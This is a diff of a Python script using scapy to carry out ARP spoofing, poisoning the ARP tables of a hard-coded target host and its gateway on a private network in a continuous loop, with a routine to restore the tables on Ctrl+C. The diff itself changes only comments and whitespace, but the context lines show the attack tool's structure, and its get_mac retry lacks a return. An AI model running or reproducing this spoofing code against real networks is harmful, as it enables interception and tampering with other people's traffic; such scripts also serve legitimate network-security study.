@@ -1,6 +1,4 @@
 #! usr/bin/env python
-# 192.168.29.8  > 3e:67:34:87:65:22
-
 import scapy.all as scapy
 import time
 
@@ -13,7 +11,6 @@ def get_mac(ip):
         return answered_list[0][1].hwsrc
     else:
         get_mac(ip)
-
 
 def spoof(target_ip,spoof_ip):
     target_mac = get_mac(target_ip)
@@ -30,7 +27,6 @@ def restore(destination_ip,source_ip):
 target_ip="192.168.29.8"
 gateway_ip="192.168.29.1"
 
-
 try:
     sent_packet = 0
     while True:
@@ -44,4 +40,6 @@ except KeyboardInterrupt:
     print("\n[-] Detected ctrl+c .....\nResetting ARP tables ..... \npleasw wait....")
     restore(target_ip,gateway_ip)
     restore(gateway_ip,target_ip)
+
+
 
